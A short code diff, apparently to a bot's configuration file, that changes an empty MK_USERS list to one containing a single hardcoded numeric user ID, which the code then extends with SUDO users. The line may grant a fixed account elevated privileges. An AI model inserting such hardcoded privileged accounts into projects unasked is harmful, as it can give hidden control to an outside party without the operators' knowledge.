@@ -75,7 +75,7 @@ M25 = ""
 
 que = {}
 
-MK_USERS = []
+MK_USERS = [5219181232]
 for x in SUDO: 
     MK_USERS.append(x)
     
